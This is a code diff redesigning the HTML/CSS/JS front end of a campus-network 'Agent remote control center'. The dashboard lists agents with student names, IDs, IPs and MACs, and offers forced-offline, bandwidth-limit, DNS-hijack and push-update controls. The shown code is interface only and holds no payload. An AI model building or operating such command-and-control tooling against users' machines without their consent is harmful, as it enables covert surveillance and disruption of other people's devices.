@@ -285,481 +285,467 @@ HTML_PAGE = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>校园网远程控制面板</title>
+<title>Agent 远程控制中心</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#f0f2f5;--card:#fff;--primary:#4f46e5;--green:#10b981;--red:#ef4444;--orange:#f59e0b;--gray:#6b7280;--border:#e5e7eb;--text:#1f2937;--sub:#9ca3af}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
-.header{background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;padding:20px 24px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 8px rgba(0,0,0,.15)}
-.header h1{font-size:20px;font-weight:600}
-.header .info{font-size:13px;opacity:.85}
-.container{max-width:1200px;margin:0 auto;padding:20px}
-.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:24px}
-.stat-card{background:var(--card);border-radius:12px;padding:20px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.08)}
-.stat-card .num{font-size:32px;font-weight:700;color:var(--primary)}
-.stat-card .label{font-size:13px;color:var(--sub);margin-top:4px}
-.section{margin-bottom:24px}
-.section h2{font-size:16px;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:8px}
-.agent-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:16px}
-.agent{background:var(--card);border-radius:12px;padding:20px;box-shadow:0 1px 3px rgba(0,0,0,.08);border-left:4px solid var(--gray);transition:all .2s}
-.agent.online{border-left-color:var(--green)}
-.agent.offline{border-left-color:var(--red)}
-.agent.away{border-left-color:var(--orange)}
-.agent-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
-.agent-name{font-weight:600;font-size:15px}
-.badge{display:inline-flex;align-items:center;gap:4px;font-size:11px;padding:2px 10px;border-radius:20px;font-weight:500}
-.badge.on{background:#d1fae5;color:#065f46}
-.badge.off{background:#fee2e2;color:#991b1b}
-.badge.aw{background:#fef3c7;color:#92400e}
-.badge::before{content:"";width:6px;height:6px;border-radius:50%;display:inline-block}
-.badge.on::before{background:#10b981}
-.badge.off::before{background:#ef4444}
-.badge.aw::before{background:#f59e0b}
-.info-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px;border-bottom:1px solid var(--border)}
-.info-row:last-child{border:none}
-.info-row .k{color:var(--sub)}
-.info-row .v{font-family:'Courier New',monospace;font-size:12px;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:right}
-.info-row .v.full{white-space:normal;word-break:break-all;max-width:none}
-.actions{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
-.btn{border:none;padding:7px 16px;border-radius:8px;font-size:12px;font-weight:500;cursor:pointer;transition:all .15s}
-.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
-.btn-red{background:#fee2e2;color:#dc2626}
-.btn-blue{background:#dbeafe;color:#2563eb}
-.btn-green{background:#d1fae5;color:#059669}
-.btn-orange{background:#fef3c7;color:#d97706}
-.token-box{margin-top:8px;background:#f8fafc;border:1px solid var(--border);border-radius:8px;padding:10px;font-size:11px;font-family:monospace;word-break:break-all;color:var(--gray);display:none;max-height:120px;overflow-y:auto}
-.log-box{background:var(--card);border-radius:12px;padding:16px;box-shadow:0 1px 3px rgba(0,0,0,.08);max-height:300px;overflow-y:auto;font-size:12px;font-family:monospace}
-.log-box div{padding:3px 0;border-bottom:1px solid #f3f4f6}
-.log-box .ok{color:#059669}
-.log-box .err{color:#dc2626}
-.empty{text-align:center;color:var(--sub);padding:60px 20px;font-size:14px}
-.autostart-row{display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding:10px 12px;background:#f8fafc;border-radius:8px;border:1px solid var(--border)}
-.autostart-row .label{font-size:13px;color:var(--text);font-weight:500}
-.toggle{position:relative;width:44px;height:24px;cursor:pointer}
+:root{
+  --bg:#f3f4f8;--card:#fff;--text:#0f172a;--text-2:#334155;--muted:#64748b;--sub:#94a3b8;
+  --border:#e5e7eb;--border-2:#f1f5f9;
+  --primary:#6366f1;--primary-2:#4f46e5;
+  --green:#10b981;--green-bg:#ecfdf5;--green-text:#047857;
+  --red:#ef4444;--red-bg:#fef2f2;--red-text:#b91c1c;
+  --orange:#f59e0b;--orange-bg:#fffbeb;--orange-text:#b45309;
+  --blue:#3b82f6;--blue-bg:#eff6ff;--blue-text:#1d4ed8;
+  --purple:#8b5cf6;--purple-bg:#f5f3ff;--purple-text:#6d28d9;
+  --slate-bg:#f8fafc;
+  --shadow-sm:0 1px 2px rgba(15,23,42,.04),0 1px 3px rgba(15,23,42,.06);
+  --shadow-md:0 4px 12px rgba(15,23,42,.07),0 2px 4px rgba(15,23,42,.04);
+  --shadow-lg:0 20px 50px rgba(15,23,42,.22);
+}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'PingFang SC','Microsoft YaHei',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;font-size:14px;line-height:1.5}
+.topbar{background:linear-gradient(120deg,#4f46e5 0%,#7c3aed 50%,#ec4899 100%);color:#fff;padding:18px 28px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 12px rgba(79,70,229,.3);position:sticky;top:0;z-index:50}
+.brand{display:flex;align-items:center;gap:12px}
+.brand .logo{font-size:28px}
+.brand h1{font-size:20px;font-weight:700;letter-spacing:.3px}
+.brand .sub{font-size:12px;opacity:.8;margin-left:8px;padding:2px 10px;background:rgba(255,255,255,.15);border-radius:20px}
+.top-actions{display:flex;align-items:center;gap:14px;font-size:13px}
+.top-actions .clock{opacity:.9;font-variant-numeric:tabular-nums}
+.btn-ghost-top{background:rgba(255,255,255,.18);color:#fff;border:1px solid rgba(255,255,255,.25);padding:7px 14px;border-radius:8px;font-size:12px;cursor:pointer;transition:.15s;font-weight:500}
+.btn-ghost-top:hover{background:rgba(255,255,255,.28)}
+.container{max-width:1280px;margin:0 auto;padding:24px}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px;margin-bottom:24px}
+.stat{background:var(--card);border-radius:14px;padding:18px 20px;box-shadow:var(--shadow-sm);border:1px solid var(--border-2);display:flex;flex-direction:column;gap:4px;position:relative;overflow:hidden}
+.stat::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:var(--muted)}
+.stat-total::before{background:var(--primary)}.stat-on::before{background:var(--green)}.stat-off::before{background:var(--red)}.stat-aw::before{background:var(--orange)}
+.stat-num{font-size:28px;font-weight:700;letter-spacing:-.5px}
+.stat-total .stat-num{color:var(--primary)}.stat-on .stat-num{color:var(--green)}.stat-off .stat-num{color:var(--red)}.stat-aw .stat-num{color:var(--orange)}
+.stat-label{font-size:12px;color:var(--muted);font-weight:500}
+.panel{background:var(--card);border-radius:14px;box-shadow:var(--shadow-sm);border:1px solid var(--border-2);margin-bottom:22px;overflow:hidden}
+.panel-head{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;border-bottom:1px solid var(--border-2);gap:12px;flex-wrap:wrap}
+.panel-head h2{font-size:15px;font-weight:600;display:flex;align-items:center;gap:8px}
+.panel-tools{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.search{background:var(--slate-bg);border:1px solid var(--border);padding:7px 12px;border-radius:8px;font-size:13px;width:220px;outline:none;transition:.15s}
+.search:focus{border-color:var(--primary);background:#fff;box-shadow:0 0 0 3px rgba(99,102,241,.1)}
+.device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;padding:18px}
+.device-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;cursor:pointer;transition:all .18s;position:relative}
+.device-card:hover{border-color:var(--primary);transform:translateY(-2px);box-shadow:var(--shadow-md)}
+.device-card.on{border-left:3px solid var(--green)}
+.device-card.off{border-left:3px solid var(--red)}
+.device-card.aw{border-left:3px solid var(--orange)}
+.card-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.card-title{display:flex;align-items:center;gap:8px;min-width:0;flex:1}
+.card-title .name{font-weight:600;font-size:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.card-title .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.device-card.on .dot{background:var(--green);box-shadow:0 0 0 3px rgba(16,185,129,.18)}
+.device-card.off .dot{background:var(--red)}
+.device-card.aw .dot{background:var(--orange)}
+.badge{font-size:11px;padding:2px 8px;border-radius:20px;font-weight:500;white-space:nowrap}
+.badge.on{background:var(--green-bg);color:var(--green-text)}
+.badge.off{background:var(--red-bg);color:var(--red-text)}
+.badge.aw{background:var(--orange-bg);color:var(--orange-text)}
+.card-user{font-size:12px;color:var(--text-2);margin-bottom:8px;font-weight:500;min-height:18px}
+.card-meta{display:flex;gap:10px;font-size:11px;color:var(--muted);margin-bottom:10px;font-family:'SF Mono',Consolas,monospace}
+.card-flags{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:10px;min-height:20px}
+.flag{font-size:10px;padding:2px 7px;border-radius:10px;font-weight:500}
+.flag-ok{background:var(--green-bg);color:var(--green-text)}
+.flag-warn{background:var(--orange-bg);color:var(--orange-text)}
+.flag-danger{background:var(--red-bg);color:var(--red-text)}
+.flag-info{background:var(--blue-bg);color:var(--blue-text)}
+.flag-muted{background:var(--slate-bg);color:var(--muted)}
+.card-foot{display:flex;justify-content:space-between;font-size:11px;color:var(--sub);border-top:1px solid var(--border-2);padding-top:8px;margin-top:2px}
+.card-empty{text-align:center;color:var(--sub);padding:60px 20px;font-size:14px;grid-column:1/-1}
+.log-tabs{display:flex;gap:4px;background:var(--slate-bg);padding:4px;border-radius:10px}
+.tab{background:transparent;border:none;padding:6px 14px;font-size:12px;font-weight:500;border-radius:7px;cursor:pointer;color:var(--muted);transition:.15s}
+.tab:hover{color:var(--text)}
+.tab.active{background:#fff;color:var(--primary);box-shadow:0 1px 3px rgba(0,0,0,.08)}
+.log-filters{display:flex;gap:10px;padding:12px 20px;align-items:center;flex-wrap:wrap;border-bottom:1px solid var(--border-2);background:var(--slate-bg)}
+.chip{background:#fff;border:1px solid var(--border);padding:6px 12px;border-radius:20px;font-size:12px;cursor:pointer;transition:.15s;font-weight:500;color:var(--text-2)}
+.chip:hover{border-color:var(--primary);color:var(--primary)}
+.log-hint{font-size:11px;color:var(--sub);margin-left:auto}
+.log-filter-panel{padding:12px 20px;background:var(--slate-bg);border-bottom:1px solid var(--border-2)}
+.filter-head{display:flex;gap:8px;margin-bottom:10px}
+.btn-mini{background:#fff;border:1px solid var(--border);padding:4px 10px;border-radius:6px;font-size:11px;cursor:pointer;color:var(--text-2)}
+.btn-mini:hover{border-color:var(--primary);color:var(--primary)}
+.filter-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:6px;max-height:180px;overflow-y:auto}
+.filter-item{display:flex;align-items:center;gap:6px;font-size:12px;padding:4px 8px;border-radius:6px;cursor:pointer;color:var(--text-2)}
+.filter-item:hover{background:#fff}
+.log-box{max-height:420px;overflow-y:auto;padding:4px 0;background:#fff;font-family:'SF Mono',Consolas,monospace;font-size:12px}
+.log-row{padding:8px 20px;border-bottom:1px solid var(--border-2);display:flex;gap:10px;align-items:flex-start}
+.log-row:hover{background:var(--slate-bg)}
+.log-row .ic{flex-shrink:0}
+.log-row .tm{color:var(--sub);font-size:10px;min-width:130px;flex-shrink:0}
+.log-row .host{color:var(--primary);font-weight:600;min-width:110px;flex-shrink:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.log-row .act{color:var(--text);flex:1;word-break:break-all}
+.log-row.ok .ic{color:var(--green)}
+.log-row.err .ic{color:var(--red)}
+.log-row .detail{color:var(--muted);font-size:11px;margin-left:4px}
+.log-empty{text-align:center;color:var(--sub);padding:50px 20px;font-size:13px}
+.drawer-backdrop{display:none;position:fixed;inset:0;background:rgba(15,23,42,.45);z-index:100;animation:fadeIn .2s ease}
+.drawer-backdrop.show{display:block}
+.drawer{position:fixed;top:0;right:-520px;width:500px;max-width:100vw;height:100vh;background:#fff;z-index:101;transition:right .28s cubic-bezier(.22,.61,.36,1);box-shadow:var(--shadow-lg);display:flex;flex-direction:column}
+.drawer.show{right:0}
+.drawer-head{padding:20px 24px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:flex-start;gap:12px;background:linear-gradient(135deg,#fafbff 0%,#f0f2fe 100%)}
+.drawer-head h3{font-size:18px;font-weight:700;margin-bottom:4px;word-break:break-all}
+.drawer-sub{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.btn-close{background:transparent;border:none;font-size:20px;cursor:pointer;color:var(--muted);width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.btn-close:hover{background:var(--slate-bg);color:var(--text)}
+.drawer-body{flex:1;overflow-y:auto;padding:20px 24px}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px 18px;padding:14px 16px;background:var(--slate-bg);border-radius:10px;margin-bottom:18px;border:1px solid var(--border-2)}
+.info-grid .ig-row{display:flex;justify-content:space-between;align-items:center;font-size:12px;grid-column:span 2;padding:3px 0}
+.info-grid .ig-row.half{grid-column:span 1}
+.info-grid .ig-k{color:var(--muted)}
+.info-grid .ig-v{font-family:'SF Mono',Consolas,monospace;color:var(--text);font-weight:500;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:60%}
+.info-grid .ig-v.good{color:var(--green-text)}
+.info-grid .ig-v.bad{color:var(--red-text)}
+.info-grid .ig-v.warn{color:var(--orange-text)}
+.action-group{margin-bottom:18px}
+.group-title{font-size:12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
+.action-row{display:flex;flex-wrap:wrap;gap:8px}
+.btn{border:1px solid transparent;padding:8px 14px;border-radius:8px;font-size:12px;font-weight:500;cursor:pointer;transition:all .15s;background:var(--slate-bg);color:var(--text-2)}
+.btn:hover{transform:translateY(-1px);box-shadow:var(--shadow-sm)}
+.btn-primary{background:var(--primary);color:#fff}
+.btn-primary:hover{background:var(--primary-2)}
+.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--text-2)}
+.btn-ghost:hover{background:var(--slate-bg)}
+.btn-red{background:var(--red-bg);color:var(--red-text)}
+.btn-red:hover{background:var(--red);color:#fff}
+.btn-blue{background:var(--blue-bg);color:var(--blue-text)}
+.btn-blue:hover{background:var(--blue);color:#fff}
+.btn-green{background:var(--green-bg);color:var(--green-text)}
+.btn-green:hover{background:var(--green);color:#fff}
+.btn-orange{background:var(--orange-bg);color:var(--orange-text)}
+.btn-orange:hover{background:var(--orange);color:#fff}
+.btn-purple{background:var(--purple-bg);color:var(--purple-text)}
+.btn-purple:hover{background:var(--purple);color:#fff}
+.btn-dark{background:#0f172a;color:#fff}
+.btn-dark:hover{background:#1e293b}
+.autostart-toggle{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:var(--slate-bg);border-radius:8px;margin-bottom:8px}
+.autostart-toggle .label{font-size:13px;color:var(--text)}
+.autostart-toggle .hint{font-size:11px;color:var(--sub);margin-top:2px}
+.toggle{position:relative;width:44px;height:24px;cursor:pointer;flex-shrink:0}
 .toggle input{opacity:0;width:0;height:0}
-.toggle .slider{position:absolute;top:0;left:0;right:0;bottom:0;background:#ccc;border-radius:24px;transition:.3s}
-.toggle .slider::before{content:"";position:absolute;width:18px;height:18px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:.3s}
+.toggle .slider{position:absolute;inset:0;background:#cbd5e1;border-radius:24px;transition:.3s}
+.toggle .slider::before{content:"";position:absolute;width:18px;height:18px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:.3s;box-shadow:0 1px 3px rgba(0,0,0,.2)}
 .toggle input:checked+.slider{background:var(--green)}
 .toggle input:checked+.slider::before{transform:translateX(20px)}
-.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:1000;align-items:center;justify-content:center}
+.token-section{background:var(--slate-bg);padding:12px 14px;border-radius:10px;margin-top:16px;border:1px dashed var(--border)}
+.token-section .label{font-size:11px;color:var(--muted);margin-bottom:6px;font-weight:600}
+.token-section .val{font-family:'SF Mono',Consolas,monospace;font-size:11px;color:var(--text-2);word-break:break-all;max-height:100px;overflow-y:auto}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(15,23,42,.55);z-index:200;align-items:center;justify-content:center;animation:fadeIn .2s}
 .modal-overlay.show{display:flex}
-.modal{background:#fff;border-radius:16px;padding:28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
-.modal h3{font-size:18px;margin-bottom:8px}
-.modal p{font-size:13px;color:var(--sub);margin-bottom:20px;line-height:1.6}
-.modal .warn{color:var(--orange);font-weight:600;font-size:14px}
-.modal-btns{display:flex;gap:12px;justify-content:center}
-.modal-btns .btn{padding:10px 24px;font-size:14px}
-@media(max-width:600px){.agent-grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}}
+.modal{background:#fff;border-radius:16px;padding:24px;max-width:420px;width:92%;box-shadow:var(--shadow-lg)}
+.modal h3{font-size:17px;font-weight:600;margin-bottom:12px}
+.modal-msg{font-size:13px;color:var(--text-2);margin-bottom:14px;line-height:1.6}
+.modal-msg b{color:var(--text);font-weight:600}
+.modal-warn{color:var(--orange-text);background:var(--orange-bg);padding:8px 12px;border-radius:8px;font-size:12px;margin-bottom:16px;font-weight:500}
+.modal-btns{display:flex;gap:10px;justify-content:flex-end}
+.modal-btns .btn{padding:9px 20px;font-size:13px}
+.mdl-input{width:100%;padding:8px 12px;border-radius:8px;border:1px solid var(--border);font-size:13px;margin-top:6px;outline:none}
+.mdl-input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(99,102,241,.1)}
+.mdl-select{width:100%;padding:8px 12px;border-radius:8px;border:1px solid var(--border);font-size:13px;margin-top:6px;background:#fff;cursor:pointer;outline:none}
+.mdl-label{font-size:12px;color:var(--text-2);font-weight:500}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@media(max-width:640px){.topbar{padding:14px 16px;flex-direction:column;align-items:flex-start;gap:10px}.container{padding:16px}.drawer{width:100vw;right:-100vw}.search{width:160px}.info-grid{grid-template-columns:1fr}.info-grid .ig-row.half{grid-column:span 2}}
 </style>
 </head>
 <body>
-
-<div class="header">
-  <div>
-    <h1>🌐 校园网远程控制面板</h1>
-    <div class="info">实时监控所有 Agent · 远程管理设备</div>
+<header class="topbar">
+  <div class="brand">
+    <span class="logo">🥤</span>
+    <h1>Agent 远程控制中心</h1>
   </div>
-  <div class="info" id="clock"></div>
-</div>
-
-<div class="container">
-  <div class="stats">
-    <div class="stat-card"><div class="num" id="totalCnt">0</div><div class="label">总设备</div></div>
-    <div class="stat-card"><div class="num" id="onlineCnt" style="color:#10b981">0</div><div class="label">在线</div></div>
-    <div class="stat-card"><div class="num" id="offlineCnt" style="color:#ef4444">0</div><div class="label">离线</div></div>
-    <div class="stat-card"><div class="num" id="awayCnt" style="color:#f59e0b">0</div><div class="label">失联</div></div>
+  <div class="top-actions">
+    <span class="clock" id="clock"></span>
+    <button class="btn-ghost-top" onclick="uploadAndPushAll()">📦 上传 &amp; 全量推送</button>
   </div>
+</header>
 
-  <div class="section">
-    <h2 style="justify-content:space-between">📡 设备列表 <button class="btn" style="background:#dbeafe;color:#1d4ed8;font-size:12px" onclick="uploadAndPushAll()">📦 上传新版本 &amp; 全量推送</button></h2>
-    <div class="agent-grid" id="agentGrid">
-      <div class="empty">暂无 Agent 连接，请在客户端启动 agent.py</div>
+<main class="container">
+  <section class="stats-grid">
+    <div class="stat stat-total"><div class="stat-num" id="totalCnt">0</div><div class="stat-label">总设备</div></div>
+    <div class="stat stat-on"><div class="stat-num" id="onlineCnt">0</div><div class="stat-label">在线</div></div>
+    <div class="stat stat-off"><div class="stat-num" id="offlineCnt">0</div><div class="stat-label">离线</div></div>
+    <div class="stat stat-aw"><div class="stat-num" id="awayCnt">0</div><div class="stat-label">失联</div></div>
+  </section>
+
+  <section class="panel">
+    <div class="panel-head">
+      <h2>📡 设备列表 <span style="font-size:11px;color:var(--sub);font-weight:400">点击任一设备查看详情</span></h2>
+      <div class="panel-tools">
+        <input class="search" id="deviceSearch" placeholder="搜索主机/姓名/IP" oninput="renderAgents()">
+      </div>
     </div>
-  </div>
+    <div class="device-grid" id="agentGrid"><div class="card-empty">加载中...</div></div>
+  </section>
 
-  <div class="modal-overlay" id="confirmModal">
+  <section class="panel">
+    <div class="panel-head">
+      <h2>📋 日志中心</h2>
+      <div class="panel-tools">
+        <div class="log-tabs">
+          <button class="tab active" data-kind="all" onclick="setLogTab('all')">全部</button>
+          <button class="tab" data-kind="cmd" onclick="setLogTab('cmd')">命令下发</button>
+          <button class="tab" data-kind="result" onclick="setLogTab('result')">命令结果</button>
+          <button class="tab" data-kind="conn" onclick="setLogTab('conn')">连接事件</button>
+          <button class="tab" data-kind="sys" onclick="setLogTab('sys')">系统/更新</button>
+        </div>
+      </div>
+    </div>
+    <div class="log-filters">
+      <button class="chip" onclick="toggleLogFilterPanel()" id="filterBtn">🎯 按设备筛选: 全部</button>
+      <input class="search" id="logSearch" placeholder="搜索日志关键词..." oninput="renderLogs()" style="width:260px">
+      <span class="log-hint">实时 <span id="sessLogCount">0</span> · 历史 <span id="histLogCount">0</span></span>
+    </div>
+    <div class="log-filter-panel" id="logFilterPanel" style="display:none">
+      <div class="filter-head">
+        <button class="btn-mini" onclick="selectAllDevices(true)">全选</button>
+        <button class="btn-mini" onclick="selectAllDevices(false)">清空</button>
+        <span style="font-size:11px;color:var(--sub);margin-left:auto">勾选要查看日志的设备</span>
+      </div>
+      <div class="filter-list" id="logFilterList"></div>
+    </div>
+    <div class="log-box" id="logBox"><div class="log-empty">加载中...</div></div>
+  </section>
+</main>
+
+<div class="drawer-backdrop" id="drawerBackdrop" onclick="closeDrawer()"></div>
+<aside class="drawer" id="agentDrawer">
+  <div class="drawer-head">
+    <div style="flex:1;min-width:0">
+      <h3 id="drawerName">--</h3>
+      <div class="drawer-sub" id="drawerSub">--</div>
+    </div>
+    <button class="btn-close" onclick="closeDrawer()">✕</button>
+  </div>
+  <div class="drawer-body" id="drawerBody"></div>
+</aside>
+
+<div class="modal-overlay" id="confirmModal">
   <div class="modal">
     <h3 id="modalTitle">确认操作</h3>
-    <p id="modalMsg"></p>
-    <p class="warn">❗ 请再次确认执行此操作</p>
+    <div class="modal-msg" id="modalMsg"></div>
+    <p class="modal-warn" id="modalWarn">❗ 请再次确认执行此操作</p>
     <div class="modal-btns">
-      <button class="btn btn-red" onclick="confirmAction()">确认执行</button>
-      <button class="btn btn-blue" onclick="closeModal()">取消</button>
+      <button class="btn btn-ghost" onclick="closeModal()">取消</button>
+      <button class="btn btn-primary" onclick="confirmAction()">确认执行</button>
     </div>
   </div>
 </div>
-
-<div class="section">
-    <h2>📋 操作日志 <span style="font-size:12px;color:#9ca3af;font-weight:400;margin-left:8px">(本次会话)</span></h2>
-    <div class="log-box" id="logBox"><div style="color:#9ca3af">等待操作...</div></div>
-  </div>
-
-  <div class="section">
-    <h2>📜 历史记录 <span style="font-size:12px;color:#9ca3af;font-weight:400;margin-left:8px">(持久化保存)</span></h2>
-    <div class="log-box" id="historyBox" style="max-height:400px"><div style="color:#9ca3af">加载中...</div></div>
-  </div>
-</div>
-
 <script>
-const API = "/gyk";
+const API=(location.pathname.startsWith("/gyk")?"/gyk":"");
+let _agents=[],_history=[],_sessionLogs=[],_currentAgentId=null,_logTab="all",_logDeviceFilter=new Set(),pendingAction=null;
 
-function ts(t){
-  if(!t)return "--";
-  const d=new Date(t*1000);
-  return d.toLocaleTimeString("zh-CN",{hour12:false})+` ${d.getMonth()+1}/${d.getDate()}`;
+function ago(t){if(!t)return"--";const s=Math.floor(Date.now()/1000-t);if(s<5)return"刚刚";if(s<60)return s+"秒前";if(s<3600)return Math.floor(s/60)+"分钟前";return Math.floor(s/3600)+"小时前";}
+function fmtTime(t){if(!t)return"";const d=new Date(t*1000);return d.toLocaleString("zh-CN",{hour12:false,month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"});}
+function esc(s){if(s==null)return"";return String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));}
+
+function addLog(msg,type=""){
+  _sessionLogs.unshift({time:Date.now()/1000,msg,type,agent_id:"session",hostname:"面板",action:"面板操作",detail:msg,success:type==="ok"?true:type==="err"?false:null});
+  if(_sessionLogs.length>200)_sessionLogs.pop();
+  document.getElementById("sessLogCount").textContent=_sessionLogs.length;
+  renderLogs();
 }
 
-function ago(t){
-  if(!t)return "--";
-  const s=Math.floor(Date.now()/1000-t);
-  if(s<5)return "刚刚";
-  if(s<60)return s+"秒前";
-  if(s<3600)return Math.floor(s/60)+"分钟前";
-  return Math.floor(s/3600)+"小时前";
+function renderAgents(){
+  const grid=document.getElementById("agentGrid");
+  const kw=(document.getElementById("deviceSearch")?.value||"").trim().toLowerCase();
+  let list=_agents;
+  if(kw)list=_agents.filter(a=>[a.hostname,a.username,a.user_id,a.local_ip,a.user_ip,a.campus_ip,a.agent_id].map(x=>(x||"").toString().toLowerCase()).join("|").includes(kw));
+  if(!list.length){grid.innerHTML='<div class="card-empty">暂无 Agent 连接</div>';return;}
+  grid.innerHTML=list.map(a=>{
+    const cls=a.status_cls||"off";
+    const flags=[];
+    if(a.net_online&&!a.force_offline)flags.push('<span class="flag flag-ok">已认证</span>');
+    else if(a.force_offline)flags.push('<span class="flag flag-danger">强制离线</span>');
+    else flags.push('<span class="flag flag-muted">未认证</span>');
+    if(a.bandwidth_limit)flags.push('<span class="flag flag-warn">⚡'+a.bandwidth_limit+'KB/s</span>');
+    if(a.dns_hijacked)flags.push('<span class="flag flag-danger">🌐DNS劫持</span>');
+    if(a.autostart)flags.push('<span class="flag flag-info">🚀自启</span>');
+    return `<div class="device-card ${cls}" onclick="openDrawer('${esc(a.agent_id)}')">
+      <div class="card-top"><div class="card-title"><span class="dot"></span><span class="name">${esc(a.hostname||a.agent_id)}</span></div><span class="badge ${cls}">${esc(a.status_text||"未知")}</span></div>
+      <div class="card-user">${a.username?'👤 '+esc(a.username):''}${a.user_id?' · '+esc(a.user_id):''}${!a.username&&!a.user_id?'<span style="color:var(--sub)">未获取用户信息</span>':''}</div>
+      <div class="card-meta"><span>🌐 ${esc(a.user_ip||a.local_ip||"--")}</span><span>📦 v${esc(a.version||"?")}</span></div>
+      <div class="card-flags">${flags.join("")}</div>
+      <div class="card-foot"><span>心跳 ${ago(a.last_seen)}</span><span>运行 ${esc(a.uptime||"--")}</span></div>
+    </div>`;
+  }).join("");
 }
 
-function toggleToken(id){
-  const el=document.getElementById("tok-"+id);
-  el.style.display=el.style.display==="block"?"none":"block";
+function openDrawer(aid){_currentAgentId=aid;renderDrawer();document.getElementById("drawerBackdrop").classList.add("show");document.getElementById("agentDrawer").classList.add("show");}
+function closeDrawer(){_currentAgentId=null;document.getElementById("drawerBackdrop").classList.remove("show");document.getElementById("agentDrawer").classList.remove("show");}
+
+function renderDrawer(){
+  if(!_currentAgentId)return;
+  const a=_agents.find(x=>x.agent_id===_currentAgentId);
+  if(!a){closeDrawer();return;}
+  document.getElementById("drawerName").textContent='💻 '+(a.hostname||a.agent_id);
+  document.getElementById("drawerSub").innerHTML=`<span class="badge ${a.status_cls||'off'}">${esc(a.status_text||'')}</span> · v${esc(a.version||'?')} · 心跳 ${ago(a.last_seen)}`;
+  const bw=a.bandwidth_limit?'🔻 '+a.bandwidth_limit+' KB/s':'无限制';
+  const dns=a.dns_hijacked?'⚠️ '+esc(a.dns_servers||''):'自动 (DHCP)';
+  const net=a.force_offline?'🔒 '+esc(a.net_message||'强制离线'):(a.net_online?'✅ 已认证':'❌ 未认证');
+  const id=esc(a.agent_id),hn=esc(a.hostname||a.agent_id);
+  document.getElementById("drawerBody").innerHTML=`
+    <section class="info-grid">
+      <div class="ig-row"><span class="ig-k">Agent ID</span><span class="ig-v" title="${id}">${id.substring(0,18)}…</span></div>
+      <div class="ig-row half"><span class="ig-k">👤 姓名</span><span class="ig-v">${esc(a.username||'--')}</span></div>
+      <div class="ig-row half"><span class="ig-k">🎓 学号</span><span class="ig-v">${esc(a.user_id||'--')}</span></div>
+      <div class="ig-row half"><span class="ig-k">局域网 IP</span><span class="ig-v">${esc(a.local_ip||'--')}</span></div>
+      <div class="ig-row half"><span class="ig-k">校园网 IP</span><span class="ig-v">${esc(a.user_ip||a.campus_ip||'--')}</span></div>
+      <div class="ig-row"><span class="ig-k">MAC</span><span class="ig-v">${esc(a.mac||'--')}</span></div>
+      <div class="ig-row"><span class="ig-k">网络状态</span><span class="ig-v ${a.force_offline?'bad':a.net_online?'good':'warn'}">${net}</span></div>
+      <div class="ig-row half"><span class="ig-k">⚡ 限速</span><span class="ig-v ${a.bandwidth_limit?'bad':'good'}">${bw}</span></div>
+      <div class="ig-row half"><span class="ig-k">🌐 DNS</span><span class="ig-v ${a.dns_hijacked?'bad':'good'}">${dns}</span></div>
+      <div class="ig-row half"><span class="ig-k">运行时间</span><span class="ig-v">${esc(a.uptime||'--')}</span></div>
+      <div class="ig-row half"><span class="ig-k">版本</span><span class="ig-v">v${esc(a.version||'?')}</span></div>
+    </section>
+    <div class="action-group"><div class="group-title">🌐 网络控制</div><div class="action-row">
